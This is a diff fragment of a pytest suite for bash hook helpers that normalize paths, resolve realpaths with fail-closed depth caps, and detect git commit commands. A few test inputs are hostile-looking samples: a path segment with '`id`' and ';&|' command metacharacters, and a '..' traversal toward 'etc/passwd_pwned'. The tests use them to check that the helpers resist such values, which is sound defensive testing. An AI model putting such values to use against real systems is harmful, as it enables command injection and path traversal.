+        # stub instead of terminating -- bound it so that regression fails
+        # the test fast instead of hanging the pytest worker.
+        timeout=30,
     )
+
+
+# --- _lib_normalize_path_lexically -------------------------------------
+
+
+def _normalize_lexically(path: str, tmp_path: Path | None = None) -> str:
+    """Run the normalizer on PATH and return `_LIB_NORMALIZED_PATH`."""
+    script = (
+        f'set -uo pipefail; . {_LIB_SH}; '
+        '_lib_normalize_path_lexically "$1" || exit 9; printf "%s" "$_LIB_NORMALIZED_PATH"'
+    )
+    result = subprocess.run(
+        ["bash", "-c", script, "bash", path],
+        capture_output=True,
+        text=True,
+        check=False,
+        cwd=tmp_path,
+        timeout=30,
+    )
+    assert result.returncode == 0, result.stderr
+    return result.stdout
+
+
+def _lexical_normalization_oracle(path: str) -> str:
+    """`posixpath.normpath` with the two documented differences: an empty path
+    stays empty, and a trailing slash is kept. normpath also keeps exactly two
+    leading slashes (POSIX leaves that case implementation-defined), where Linux
+    reads them as one and the normalizer collapses them."""
+    if path == "":
+        return ""
+    result = posixpath.normpath(path)
+    if result.startswith("//"):
+        result = result[1:]
+    if path.endswith("/") and not result.endswith("/"):
+        result += "/"
+    return result
+
+
+_LEXICAL_NORMALIZATION_INPUTS = [
+    pytest.param("/", id="root"),
+    pytest.param("//", id="double-slash-root"),
+    pytest.param("///", id="triple-slash-root"),
+    pytest.param(".", id="dot"),
+    pytest.param("./", id="dot-trailing-slash"),
+    pytest.param("..", id="dotdot-relative"),
+    pytest.param("../", id="dotdot-relative-trailing-slash"),
+    pytest.param("a", id="relative-single"),
+    pytest.param("a/b/c", id="relative-multi"),
+    pytest.param("a/b/", id="relative-trailing-slash"),
+    pytest.param("/a/b/c", id="absolute-multi"),
+    pytest.param("/a/b/", id="absolute-trailing-slash"),
+    pytest.param("//a/b", id="leading-double-slash"),
+    pytest.param("///a/b", id="leading-triple-slash"),
+    pytest.param("/a//b///c", id="interior-double-slashes"),
+    pytest.param("/a/./b/./c", id="interior-dot-segments"),
+    pytest.param("/a/b/.", id="trailing-dot-segment"),
+    pytest.param("/a/b/./", id="trailing-dot-segment-with-slash"),
+    pytest.param("/a/../b", id="dotdot-pops-one"),
+    pytest.param("a/../b", id="relative-dotdot-pops-one"),
+    pytest.param("a/..", id="relative-dotdot-pops-to-nothing"),
+    pytest.param("a/../", id="relative-dotdot-pops-to-nothing-with-slash"),
+    pytest.param("/a/b/..", id="trailing-dotdot"),
+    pytest.param("/a/b/../", id="trailing-dotdot-with-slash"),
+    pytest.param("/..", id="dotdot-at-root"),
+    pytest.param("/../a", id="dotdot-at-root-then-segment"),
+    pytest.param("/a/../..", id="dotdot-past-root"),
+    pytest.param("//..", id="dotdot-at-double-slash-root"),
+    pytest.param("../a", id="relative-leading-dotdot"),
+    pytest.param("../../a", id="relative-leading-dotdot-run"),
+    pytest.param("../../a/../b", id="relative-leading-dotdot-run-then-pop"),
+    pytest.param("a/b/../../..", id="relative-pops-past-start"),
+    pytest.param("/a/b/c/d/../../../x", id="deep-dotdot-chain"),
+    pytest.param("/a/b/c/../../../../../../x", id="deep-dotdot-chain-past-root"),
+    pytest.param("/x/ y/*/..z/..../w/.", id="spaces-glob-and-dot-lookalike-segments"),
+    pytest.param("/x/tab\there/new\nline/../ok", id="tab-and-newline-in-segments"),
+    pytest.param("/x/$HOME/`id`/;&|/..", id="shell-metacharacters-in-segments"),
+    pytest.param("/home/u/.claude//review-narrative-ledger/f.jsonl", id="ledger-doubled-slash"),
+    pytest.param("/home/u/.claude/./review-narrative-ledger/f.jsonl", id="ledger-dot-segment"),
+    pytest.param("/home/u/.claude/x/../review-narrative-ledger/f.jsonl", id="ledger-dotdot-segment"),
+]
+
+
+class TestLibNormalizePathLexically:
+    @pytest.mark.parametrize("path", _LEXICAL_NORMALIZATION_INPUTS)
+    def test_matches_the_normpath_oracle(self, path: str) -> None:
+        assert _normalize_lexically(path) == _lexical_normalization_oracle(path)
+
+    def test_empty_path_yields_an_empty_result(self) -> None:
+        assert _normalize_lexically("") == ""
+
+    @pytest.mark.parametrize(
+        ("path", "expected"),
+        [
+            pytest.param("//a//b", "/a/b", id="leading-double-slash-collapses-to-one"),
+            pytest.param("/..", "/", id="dotdot-at-root-is-dropped"),
+            pytest.param("../a", "../a", id="relative-leading-dotdot-is-kept"),
+            pytest.param("a/..", ".", id="relative-path-that-pops-to-nothing-is-dot"),
+            pytest.param("/a/b/", "/a/b/", id="trailing-slash-is-kept"),
+            pytest.param("/a/b/.", "/a/b", id="trailing-dot-segment-is-not-a-trailing-slash"),
+            pytest.param("/a/b/..", "/a", id="trailing-dotdot-is-not-a-trailing-slash"),
+            pytest.param("/a/x/../b//c/", "/a/b/c/", id="trailing-slash-survives-collapsing"),
+            pytest.param("a/../", "./", id="relative-dot-result-keeps-the-trailing-slash"),
+        ],
+    )
+    def test_documented_behavior(self, path: str, expected: str) -> None:
+        assert _normalize_lexically(path) == expected
+
+    def test_a_very_long_path_terminates_with_the_correct_result(self) -> None:
+        """A candidate comes from untrusted command text, so a segment count in
+        the tens of thousands must still finish and come out right. The
+        subprocess timeout is only a hang guard, not a scaling bound."""
+        path = "/" + "/".join(["a"] * 50000) + "/../../b"
+        assert _normalize_lexically(path) == "/" + "/".join(["a"] * 49998) + "/b"
+
+    def test_matches_the_oracle_under_bash_compat_32(self) -> None:
+        """The normalizer's header claims it was checked with BASH_COMPAT=32.
+        One process normalizes every oracle input at that compatibility level,
+        which emulates bash 3.2's documented differences and is not a real 3.2
+        binary."""
+        paths = [param.values[0] for param in _LEXICAL_NORMALIZATION_INPUTS]
+        script = (
+            f". {_LIB_SH}; for path in \"$@\"; do "
+            '_lib_normalize_path_lexically "$path"; printf "%s\\0" "$_LIB_NORMALIZED_PATH"; done'
+        )
+        result = subprocess.run(
+            ["bash", "-c", script, "bash", *paths],
+            env={**os.environ, "BASH_COMPAT": "32"},
+            capture_output=True,
+            text=True,
+            check=False,
+            timeout=30,
+        )
+        assert result.returncode == 0, result.stderr
+        assert result.stdout.split("\0")[:-1] == [_lexical_normalization_oracle(path) for path in paths]
+
+    def test_a_glob_segment_stays_literal(self, tmp_path: Path) -> None:
+        (tmp_path / "matching-file").write_text("")
+        assert _normalize_lexically("*/x/../y", tmp_path=tmp_path) == "*/y"
+
+    def test_runs_no_external_command(self, tmp_path: Path) -> None:
+        """Sourcing _lib.sh needs `dirname`; the call itself runs with an empty
+        PATH, so any external command it ran would fail. A builtin-only
+        command substitution would still pass."""
+        empty_bin = tmp_path / "empty-bin"
+        empty_bin.mkdir()
+        script = (
+            f'. {_LIB_SH}; PATH="$1"; '
+            '_lib_normalize_path_lexically "/a//b/./c/../d/"; printf "%s" "$_LIB_NORMALIZED_PATH"'
+        )
+        result = subprocess.run(
+            ["bash", "-c", script, "bash", str(empty_bin)],
+            capture_output=True,
+            text=True,
+            check=False,
+            timeout=30,
+        )
+        assert (result.returncode, result.stdout, result.stderr) == (0, "/a/b/d/", "")
+
+    @pytest.mark.parametrize("caller_glob_state", ["set -f", "set +f"])
+    def test_leaves_the_callers_ifs_and_glob_setting_unchanged(self, caller_glob_state: str) -> None:
+        script = (
+            f'. {_LIB_SH}; {caller_glob_state}; IFS=":"; '
+            '_lib_normalize_path_lexically "/a/../b"; '
+            'case "$-" in *f*) printf "noglob " ;; *) printf "glob " ;; esac; printf "%s" "$IFS"'
+        )
+        result = subprocess.run(["bash", "-c", script], capture_output=True, text=True, check=False)
+        expected_glob = "noglob" if caller_glob_state == "set -f" else "glob"
+        assert (result.returncode, result.stdout) == (0, f"{expected_glob} :")
 
 
 class TestLibRealpathM:
@@ -4190,6 +4392,76 @@ class TestLibRealpathM:
         result = _run_realpath_m(str(target), forced_fallback=True, tmp_path=tmp_path)
         assert result.returncode == 0, result.stderr
         assert result.stdout.strip() == str(target)
+
+    def test_forced_fallback_resolves_deep_nonexistent_ancestor_chain_under_cap(
+        self, tmp_path: Path
+    ) -> None:
+        """Regression test: a realistic, if unusually deep, nonexistent-
+        ancestor chain must still resolve, not fail closed.
+
+        Twenty levels models a fresh nested `.claude/` tree, not an attack
+        shape, and stays well under
+        `_LIB_REALPATH_M_FALLBACK_MAX_DEPTH`'s iteration cap on the
+        fallback loop's ancestor walk."""
+        target = Path(tmp_path, *[f"level{i}" for i in range(20)], "newfile.txt")
+        result = _run_realpath_m(str(target), forced_fallback=True, tmp_path=tmp_path)
+        assert result.returncode == 0, result.stderr
+        assert result.stdout.strip() == str(target)
+
+    def test_forced_fallback_ancestor_chain_beyond_cap_fails_closed(self, tmp_path: Path) -> None:
+        """Regression test for `_LIB_REALPATH_M_FALLBACK_MAX_DEPTH` itself:
+        a nonexistent-ancestor chain deeper than the cap must fail closed
+        (nonzero, empty stdout), not resolve.
+
+        70 levels clears the 64-deep cap by a comfortable margin, so this
+        pins the deny side symmetric to
+        test_forced_fallback_resolves_deep_nonexistent_ancestor_chain_under_cap's
+        allow side."""
+        target = Path(tmp_path, *[f"level{i}" for i in range(70)], "newfile.txt")
+        result = _run_realpath_m(str(target), forced_fallback=True, tmp_path=tmp_path)
+        assert result.returncode != 0, (
+            f"a chain beyond the cap must fail closed, got rc=0 stdout={result.stdout!r}"
+        )
+        assert not result.stdout.strip(), f"expected empty stdout on fail-closed, got {result.stdout!r}"
+
+    def test_forced_fallback_resolves_chain_at_exact_cap(self, tmp_path: Path) -> None:
+        """Exact-boundary pin for `_LIB_REALPATH_M_FALLBACK_MAX_DEPTH` itself,
+        distinct from the generous-margin tests above: the fallback loop's
+        depth counter reaches exactly the cap on a chain two directory
+        levels shorter than the cap (one iteration checks the leaf file,
+        one checks the existing base), so this must still resolve."""
+        dirs = _REALPATH_M_FALLBACK_MAX_DEPTH - 2
+        target = Path(tmp_path, *[f"level{i}" for i in range(dirs)], "newfile.txt")
+        result = _run_realpath_m(str(target), forced_fallback=True, tmp_path=tmp_path)
+        assert result.returncode == 0, result.stderr
+        assert result.stdout.strip() == str(target)
+
+    def test_forced_fallback_chain_one_level_beyond_exact_cap_fails_closed(self, tmp_path: Path) -> None:
+        """Exact-boundary pin symmetric to
+        test_forced_fallback_resolves_chain_at_exact_cap: one more directory
+        level pushes the depth counter one past the cap, so this must fail
+        closed."""
+        dirs = _REALPATH_M_FALLBACK_MAX_DEPTH - 1
+        target = Path(tmp_path, *[f"level{i}" for i in range(dirs)], "newfile.txt")
+        result = _run_realpath_m(str(target), forced_fallback=True, tmp_path=tmp_path)
+        assert result.returncode != 0, (
+            f"a chain one level beyond the cap must fail closed, got rc=0 stdout={result.stdout!r}"
+        )
+        assert not result.stdout.strip(), f"expected empty stdout on fail-closed, got {result.stdout!r}"
+
+    def test_forced_fallback_collapses_dot_in_unresolved_suffix(self, tmp_path: Path) -> None:
+        """Required regression test: a lone `.` component in the not-yet-
+        existing suffix must be dropped, not reattached verbatim, or a
+        caller comparing the result against a literal substring (e.g.
+        ask-review-permissions.sh's `.claude/settings` match) misses a path
+        that is semantically identical but textually decorated with `./`.
+        Uses an f-string rather than pathlib's `/` operator to build the
+        target, since pathlib silently collapses a `.` segment on
+        construction and would defeat the test."""
+        target = f"{tmp_path}/newdir1/./newfile.txt"
+        result = _run_realpath_m(target, forced_fallback=True, tmp_path=tmp_path)
+        assert result.returncode == 0, result.stderr
+        assert result.stdout.strip() == f"{tmp_path}/newdir1/newfile.txt"
 
     def test_forced_fallback_rejects_dotdot_in_unresolved_suffix(self, tmp_path: Path) -> None:
         """Required regression test for a High-severity finding: the
@@ -4236,33 +4508,318 @@ class TestLibRealpathM:
         assert resolved == target
         assert "//" not in resolved
 
-    def test_forced_fallback_resolves_at_depth_budget_boundary(self, tmp_path: Path) -> None:
-        """Regression test for the walked-ancestor depth cap (10): a target
-        needing exactly 10 unresolved components to reach tmp_path (the
-        nearest existing ancestor) must still resolve -- the cap must not
-        clip a legitimate multi-level path sitting right at the boundary."""
-        target = tmp_path
-        for i in range(10):
-            target = target / f"lvl{i}"
-        result = _run_realpath_m(str(target), forced_fallback=True, tmp_path=tmp_path)
-        assert result.returncode == 0, result.stderr
-        assert result.stdout.strip() == str(target)
+    def test_forced_fallback_dirname_failure_fails_closed(self, tmp_path: Path) -> None:
+        """Regression test: a failing fallback-loop `dirname` call must not
+        corrupt the walk into resolving to the hook process's own CWD.
 
-    def test_forced_fallback_denies_past_depth_budget_dos_guard(self, tmp_path: Path) -> None:
-        """Regression test for a DoS-shaped exposure: with neither
-        realpath -m nor grealpath available, the fallback loop spawns one
-        basename+dirname pair per unresolved path component. A caller that
-        routes untrusted text through this function (e.g. a Bash-fragment
-        command word) must not let a crafted, deeply-nested nonexistent
-        path drive unbounded subprocess spawns. One component past the
-        depth budget (10) must fail closed instead."""
-        target = tmp_path
-        for i in range(11):
-            target = target / f"lvl{i}"
+        `_lib.sh`'s `current=$(dirname -- "$current") || return 1` checks
+        the exit status precisely so a failing call (empty stdout, nonzero
+        exit) returns nonzero instead of being read as success. Left
+        unchecked, the corruption chain is:
+
+        - `current` becomes "" on the swallowed failure.
+        - The loop's `/`/`.` termination guard never matches an empty
+          string.
+        - The next iteration's `test -e "."` resolves to the CWD with exit
+          0 (GNU dirname's empty-input return value) -- a result
+          indistinguishable from success to a caller that only guards
+          against nonzero exit.
+
+        The stub exits nonzero with empty stdout on the targeted
+        `--`-prefixed argument shape instead of running the real
+        `dirname`, which would let a broken/missing `|| return 1` pass
+        regardless of whether the stub fired."""
+        real_dirname = shutil.which("dirname")
+        if not real_dirname:
+            pytest.skip("dirname not found in PATH")
+
+        shim_dir = tmp_path / "realpath_shim"
+        shim_dir.mkdir()
+        stub_dirname = shim_dir / "dirname"
+        # Scoped to the `--`-prefixed argument shape the fallback loop
+        # passes, so it doesn't also intercept _lib.sh's and _config.sh's
+        # own bare, load-time `dirname "${BASH_SOURCE[0]}"` bootstrap calls.
+        stub_dirname.write_text(
+            "#!/bin/bash\n"
+            'if [ "$1" = "--" ]; then\n'
+            "  exit 1\n"
+            "fi\n"
+            f'exec {real_dirname} "$@"\n'
+        )
+        stub_dirname.chmod(0o755)
+
+        target = tmp_path / "does-not-exist-xyz123" / "newfile.txt"
         result = _run_realpath_m(str(target), forced_fallback=True, tmp_path=tmp_path)
-        assert result.returncode != 0 or not result.stdout.strip(), (
-            f"expected fail-closed (empty/nonzero) past the depth budget, "
-            f"got stdout={result.stdout!r} rc={result.returncode}"
+
+        assert result.returncode != 0, (
+            "a failing dirname must fail closed, not return a corrupted resolution"
+        )
+        assert not result.stdout.strip(), f"expected empty stdout on fail-closed, got {result.stdout!r}"
+
+    def test_forced_fallback_basename_failure_fails_closed(self, tmp_path: Path) -> None:
+        """Regression test for the fallback loop's `basename` call
+        (`_lib.sh`'s `suffix_component=$(basename -- "$current") ||
+        return 1`).
+
+        Same target shape and PATH-stub technique as
+        test_forced_fallback_dirname_failure_fails_closed: the first
+        `basename -- "$current"` call in the walk is the one under test.
+
+        Pinned at a different call site than that sibling test, so a
+        future edit dropping just this site's `|| return 1` isn't left
+        uncaught -- independent pin, not redundant with that sibling."""
+        real_basename = shutil.which("basename")
+        if not real_basename:
+            pytest.skip("basename not found in PATH")
+
+        shim_dir = tmp_path / "realpath_shim"
+        shim_dir.mkdir()
+        stub_basename = shim_dir / "basename"
+        # Scoped the same way as the dirname stub above, for consistency,
+        # though basename has no load-time bootstrap caller today.
+        stub_basename.write_text(
+            "#!/bin/bash\n"
+            'if [ "$1" = "--" ]; then\n'
+            "  exit 1\n"
+            "fi\n"
+            f'exec {real_basename} "$@"\n'
+        )
+        stub_basename.chmod(0o755)
+
+        target = tmp_path / "does-not-exist-xyz123" / "newfile.txt"
+        result = _run_realpath_m(str(target), forced_fallback=True, tmp_path=tmp_path)
+
+        assert result.returncode != 0, (
+            "a failing basename must fail closed, not return a corrupted resolution"
+        )
+        assert not result.stdout.strip(), f"expected empty stdout on fail-closed, got {result.stdout!r}"
+
+    def test_forced_fallback_dot_branch_dirname_failure_fails_closed(self, tmp_path: Path) -> None:
+        """Regression test for the fallback loop's `.`-branch `dirname`
+        call (`_lib.sh`'s `current=$(dirname -- "$current") || return 1`
+        inside the `.` case).
+
+        Reached only after a literal `.` path segment resolves to its own
+        basename mid-walk. Same target shape as
+        test_forced_fallback_collapses_dot_in_unresolved_suffix.
+
+        Pins the `.`-branch's own `|| return 1` independently of
+        test_forced_fallback_dirname_failure_fails_closed, which only
+        exercises the bottom-of-loop dirname call one iteration earlier."""
+        real_dirname = shutil.which("dirname")
+        if not real_dirname:
+            pytest.skip("dirname not found in PATH")
+
+        shim_dir = tmp_path / "realpath_shim"
+        shim_dir.mkdir()
+        stub_dirname = shim_dir / "dirname"
+        # For this target, the walk's first dirname call (bottom-of-loop,
+        # on the untouched target) must succeed to reach the `.`-branch at
+        # all. The second dirname call, against "<tmp_path>/newdir1/.", is
+        # the one under test.
+        dot_branch_arg = f"{tmp_path}/newdir1/."
+        stub_dirname.write_text(
+            "#!/bin/bash\n"
+            f'if [ "$1" = "--" ] && [ "$2" = "{dot_branch_arg}" ]; then\n'
+            "  exit 1\n"
+            "fi\n"
+            f'exec {real_dirname} "$@"\n'
+        )
+        stub_dirname.chmod(0o755)
+
+        target = f"{tmp_path}/newdir1/./newfile.txt"
+        result = _run_realpath_m(target, forced_fallback=True, tmp_path=tmp_path)
+
+        assert result.returncode != 0, (
+            "a failing `.`-branch dirname must fail closed, not return a corrupted resolution"
+        )
+        assert not result.stdout.strip(), f"expected empty stdout on fail-closed, got {result.stdout!r}"
+
+    def test_forced_fallback_test_e_hang_capped_fails_closed(self, tmp_path: Path) -> None:
+        """Regression test: a cap-fired `test -e` (nonzero, but not the
+        clean "does not exist" 1) must not be misread as "does not exist"
+        and fall through to the decomposition logic below.
+
+        `_lib.sh`'s `elif [ "$test_e_status" -ne 1 ]; then return 1` branch
+        exists precisely to catch that ambiguous status and fail closed
+        instead.
+
+        The ambiguous component is a real, existing directory one level up
+        from the nonexistent leaf, mirroring
+        test_forced_fallback_dot_branch_dirname_failure_fails_closed's
+        directory-walk setup.
+
+        Unlike the basename/dirname stubs above, `test -e`/`test -L` omit
+        `--` (the loop's own comment in _lib.sh explains why), so this stub
+        keys on the bare `-e PATH` shape instead of a `--`-prefix check."""
+        real_test = shutil.which("test")
+        if not real_test:
+            pytest.skip("test(1) not found in PATH")
+        if not shutil.which("timeout") and not shutil.which("gtimeout"):
+            pytest.skip("neither timeout(1) nor gtimeout(1) available — BSD/macOS without coreutils")
+
+        shim_dir = tmp_path / "realpath_shim"
+        shim_dir.mkdir()
+        write_scaled_timeout_shim(shim_dir)
+        ambiguous_dir = tmp_path / "realdir"
+        ambiguous_dir.mkdir()
+        stub_test = shim_dir / "test"
+        # Scoped to the bare `-e PATH` shape and the exact ambiguous
+        # component under test, so it doesn't also intercept every other
+        # `test -e` call the walk makes at other path depths.
+        stub_test.write_text(
+            "#!/bin/bash\n"
+            f'if [ "$1" = "-e" ] && [ "$2" = "{ambiguous_dir}" ]; then\n'
+            # Ignoring SIGTERM forces timeout(1) to escalate to `-k 2`'s SIGKILL.
+            # Only that SIGKILL path emits stderr signal-death text -- a plain SIGTERM
+            # kill exits quietly, so it can't discriminate the `2>/dev/null` fix below.
+            "  trap '' TERM\n"
+            f"  sleep {scaled_shim_sleep(10)}\n"
+            "fi\n"
+            f'exec {real_test} "$@"\n'
+        )
+        stub_test.chmod(0o755)
+
+        target = ambiguous_dir / "does-not-exist-xyz123.txt"
+        with assert_cap_engaged(shim_dir, production_cap=5, command="test"):
+            result = _run_realpath_m(str(target), forced_fallback=True, tmp_path=tmp_path)
+
+        assert result.returncode != 0, (
+            "a capped-out `test -e` must fail closed, not fall through as a clean \"does not exist\""
+        )
+        assert not result.stdout.strip(), f"expected empty stdout on fail-closed, got {result.stdout!r}"
+        assert "Terminated" not in result.stderr and "Killed" not in result.stderr, (
+            "the capped call's `2>/dev/null` must suppress the cap-firing signal-death "
+            f"line, got stderr={result.stderr!r}"
+        )
+
+    def test_forced_fallback_test_l_hang_capped_fails_closed(self, tmp_path: Path) -> None:
+        """Regression test for the ambiguous-status branch at `_lib.sh`'s
+        `elif [ "$test_l_status" -ne 1 ]; then return 1`.
+
+        The ambiguous component is a real, existing dangling symlink one
+        level up from the nonexistent leaf, so `test -e` on it legitimately
+        returns false and the walk reaches the `test -L` check before the
+        stub intercepts that second call.
+
+        Pins the same ambiguity as
+        test_forced_fallback_test_e_hang_capped_fails_closed,
+        independently at the `test -L` call one branch below."""
+        real_test = shutil.which("test")
+        if not real_test:
+            pytest.skip("test(1) not found in PATH")
+        if not shutil.which("timeout") and not shutil.which("gtimeout"):
+            pytest.skip("neither timeout(1) nor gtimeout(1) available — BSD/macOS without coreutils")
+
+        shim_dir = tmp_path / "realpath_shim"
+        shim_dir.mkdir()
+        write_scaled_timeout_shim(shim_dir)
+        ambiguous_symlink = tmp_path / "dangling_link"
+        ambiguous_symlink.symlink_to(tmp_path / "does-not-exist-symlink-target-xyz")
+        stub_test = shim_dir / "test"
+        # Scoped to the bare `-L PATH` shape and the exact ambiguous
+        # component, so the walk's earlier, legitimate `test -e`/`test -L`
+        # calls on other path depths still run against the real binary.
+        stub_test.write_text(
+            "#!/bin/bash\n"
+            f'if [ "$1" = "-L" ] && [ "$2" = "{ambiguous_symlink}" ]; then\n'
+            # Ignoring SIGTERM forces timeout(1) to escalate to `-k 2`'s SIGKILL.
+            # Only that SIGKILL path emits stderr signal-death text -- a plain SIGTERM
+            # kill exits quietly, so it can't discriminate the `2>/dev/null` fix below.
+            "  trap '' TERM\n"
+            f"  sleep {scaled_shim_sleep(10)}\n"
+            "fi\n"
+            f'exec {real_test} "$@"\n'
+        )
+        stub_test.chmod(0o755)
+
+        target = ambiguous_symlink / "leaf.txt"
+        with assert_cap_engaged(shim_dir, production_cap=5, command="test"):
+            result = _run_realpath_m(str(target), forced_fallback=True, tmp_path=tmp_path)
+
+        assert result.returncode != 0, (
+            "a capped-out `test -L` must fail closed, not fall through as a clean \"not a symlink\""
+        )
+        assert not result.stdout.strip(), f"expected empty stdout on fail-closed, got {result.stdout!r}"
+        assert "Terminated" not in result.stderr and "Killed" not in result.stderr, (
+            "the capped call's `2>/dev/null` must suppress the cap-firing signal-death "
+            f"line, got stderr={result.stderr!r}"
+        )
+
+    def test_bare_invocation_under_set_e_reaches_caller_line_after_call(self, tmp_path: Path) -> None:
+        """Regression test scoped to the success path: a bare invocation of
+        `_lib_realpath_m` (not wrapped in `$(...)` or an `if`) must not let
+        the function's internal loop -- which runs as bare statements in
+        the caller's own shell -- spuriously trip the caller's `set -e` on
+        a resolution that ultimately succeeds. This does not make a bare
+        invocation safe in general: a call whose resolution legitimately
+        fails (nonzero return) still aborts the caller under `set -e`, by
+        design. Every current caller (ask-review-permissions.sh,
+        enforce-marker-script-shape.sh, require-memory-skill.sh,
+        require-plan-review.sh) already guards its invocation with
+        `$(...)`, `if`, or `||`, and must continue to. Unlike
+        `_run_realpath_m`'s `set -uo pipefail` (no `-e`), this test sources
+        `_lib.sh` under `set -e` itself so a regression is actually
+        exercised. The target is a normal nonexistent leaf directly under
+        an existing directory, so the fallback loop's first `test -e`
+        legitimately returns its ordinary false status -- the cap-timeout/
+        ambiguous case is already covered by
+        test_forced_fallback_test_e_hang_capped_fails_closed and
+        test_forced_fallback_test_l_hang_capped_fails_closed."""
+        env = dict(os.environ)
+        env["PATH"] = _forced_fallback_path_env(tmp_path)
+
+        target = tmp_path / "does-not-exist-invocation-safety.txt"
+        sentinel = "REACHED_LINE_AFTER_BARE_CALL"
+        script = f'set -e\n. {_LIB_SH}\n_lib_realpath_m "$1"\necho "{sentinel}"\n'
+        result = subprocess.run(
+            ["bash", "-c", script, "bash", str(target)],
+            capture_output=True,
+            text=True,
+            env=env,
+            check=False,
+            timeout=30,
+        )
+
+        assert result.returncode == 0, (
+            f"set -e aborted the caller before its line after the bare call: "
+            f"rc={result.returncode} stdout={result.stdout!r} stderr={result.stderr!r}"
+        )
+        assert sentinel in result.stdout.splitlines(), (
+            f"caller never reached the line after the bare call: stdout={result.stdout!r}"
+        )
+
+    def test_bare_invocation_under_set_e_aborts_caller_on_failed_resolution(self, tmp_path: Path) -> None:
+        """Failure-side counterpart to
+        test_bare_invocation_under_set_e_reaches_caller_line_after_call:
+        that sibling test's docstring claims a legitimately-failing bare
+        invocation still aborts the caller under `set -e`, but only
+        exercises the success half. This exercises the failure half, using
+        the same `..`-in-unresolved-suffix target as
+        test_forced_fallback_rejects_dotdot_in_unresolved_suffix, which
+        reaches the loop's unguarded `return 1` in the `..` case arm."""
+        env = dict(os.environ)
+        env["PATH"] = _forced_fallback_path_env(tmp_path)
+
+        target = tmp_path / "agent-reviews" / "newdir" / ".." / ".." / ".." / "etc" / "passwd_pwned"
+        sentinel = "REACHED_LINE_AFTER_BARE_CALL"
+        script = f'set -e\n. {_LIB_SH}\n_lib_realpath_m "$1"\necho "{sentinel}"\n'
+        result = subprocess.run(
+            ["bash", "-c", script, "bash", str(target)],
+            capture_output=True,
+            text=True,
+            env=env,
+            check=False,
+            timeout=30,
+        )
+
+        assert result.returncode != 0, (
+            f"set -e should have aborted the caller on a failed resolution: "
+            f"rc={result.returncode} stdout={result.stdout!r} stderr={result.stderr!r}"
+        )
+        assert sentinel not in result.stdout.splitlines(), (
+            f"caller reached the line after the bare call despite a failed resolution: "
+            f"stdout={result.stdout!r}"
         )
 
 
@@ -5355,16 +5912,6 @@ class TestRoundConsultGateDisabled:
 # exist, are sourceable, and hold the specific values every consuming hook
 # relies on — a single source of truth that drifted silently would still
 # pass each consumer's own tests if a hook simply hardcoded a copy instead.
-
-
-def _sourced_value(var_name: str) -> str:
-    result = subprocess.run(
-        ["bash", "-c", f'. {_LIB_SH}; printf "%s" "${var_name}"'],
-        capture_output=True,
-        text=True,
-        check=True,
-    )
-    return result.stdout
 
 
 def test_lib_size_threshold_bytes_is_five_megabytes() -> None:
@@ -6622,6 +7169,12 @@ class TestCommandConcludesCommit:
             "git rebase --continue",
             "git cherry-pick --continue",
             "git revert --continue",
+            # git's own option parser accepts any unambiguous prefix of a
+            # long option (gitcli(7)) -- these must match the same way.
+            "git merge --cont",
+            "git rebase --cont",
+            "git cherry-pick --cont",
+            "git revert --cont",
         ],
     )
     def test_broad_predicate_true_for_concluding_shapes(self, command: str) -> None:
@@ -6635,6 +7188,17 @@ class TestCommandConcludesCommit:
             "git rebase --skip",
             "git commit-tree abc123",
             "git status",
+            # A clean cherry-pick or revert creates its commit inside the
+            # initiating command with no separate `git commit` call, so no
+            # gate keyed on this predicate ever sees one -- pinned here as
+            # suite fact rather than only as prose.
+            "git cherry-pick abc123",
+            "git revert abc123",
+            # A real git merge option, not a prefix of --continue.
+            "git merge --commit",
+            # Longer than --continue, not a proper prefix of it.
+            "git merge --continued",
+            "git merge --continue-foo",
         ],
     )
     def test_broad_predicate_false_for_non_concluding_shapes(self, command: str) -> None:
@@ -6661,12 +7225,33 @@ class TestCommandConcludesCommit:
     ) -> None:
         assert _command_concludes_marker_gated_commit(command) == _command_concludes_commit(command)
 
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "git --attr-source HEAD commit -m x",
+            "git --attr-source=HEAD commit -m x",
+        ],
+    )
+    def test_both_predicates_recognize_commit_behind_attr_source_global_flag(
+        self, command: str
+    ) -> None:
+        """`--attr-source <tree-ish>` takes a separate-word value, so the
+        subcommand walk must skip `HEAD` and find `commit` behind it."""
+        assert _command_concludes_commit(command) == 0
+        assert _command_concludes_marker_gated_commit(command) == 0
+
     def test_narrow_predicate_excludes_rebase_continue_while_broad_includes_it(self) -> None:
         """The one input where the two predicates must diverge -- a
         fixture asserting only the narrow predicate's false here would not
         catch a regression that accidentally narrowed both."""
         assert _command_concludes_commit("git rebase --continue") == 0
         assert _command_concludes_marker_gated_commit("git rebase --continue") == 1
+
+    def test_narrow_predicate_excludes_abbreviated_rebase_continue_too(self) -> None:
+        """The rebase carve-out must exclude every abbreviated spelling of
+        `--continue`, not just the exact one."""
+        assert _command_concludes_commit("git rebase --cont") == 0
+        assert _command_concludes_marker_gated_commit("git rebase --cont") == 1
 
     def test_wrong_arity_returns_could_not_determine(self) -> None:
         result = subprocess.run(
@@ -6693,12 +7278,386 @@ class TestCommandConcludesCommit:
         assert _command_concludes_commit("git commit -m x", env=env) == 2
         assert _command_concludes_marker_gated_commit("git commit -m x", env=env) == 2
 
+    @pytest.mark.parametrize(
+        ("command", "expected_status_without_shim"),
+        [("git commit -m x", 0), ("", 1), ("ls", 1)],
+        ids=["concluding-commit", "empty-command", "non-git-command"],
+    )
+    def test_failed_fragment_read_returns_could_not_determine(
+        self, command: str, expected_status_without_shim: int
+    ) -> None:
+        """A here-string redirect that fails (e.g. an unwritable TMPDIR) skips
+        the fragment loop; the matcher must report undetermined, not no-match.
+        The `read` shim stands in for that failure without touching the
+        filesystem and prints a marker so a shell syntax error (which also
+        exits 2) cannot pass for the sentinel.
+        Without the shim, the sentinel must not over-deny."""
+        shim_marker = "read-shim-ran"
+
+        def run(prelude: str) -> subprocess.CompletedProcess[str]:
+            return subprocess.run(
+                [
+                    "bash",
+                    "-c",
+                    f'. {_LIB_SH}; {prelude or ":"}; _lib_command_concludes_marker_gated_commit "$1"',
+                    "bash",
+                    command,
+                ],
+                capture_output=True,
+                text=True,
+                check=False,
+            )
+
+        shimmed = run(f"read() {{ echo {shim_marker}; return 1; }}")
+        assert shimmed.returncode == 2
+        assert shim_marker in shimmed.stdout
+        assert shimmed.stderr == ""
+        assert run("").returncode == expected_status_without_shim
+
     def test_continue_flag_outside_matched_verb_does_not_conclude_commit(self) -> None:
-        """The fragment-boundary case _lib_command_concludes_commit_shape's
-        own comment names: `--continue` present elsewhere in COMMAND, not
-        as the matched verb's own argument, must not read as concluding a
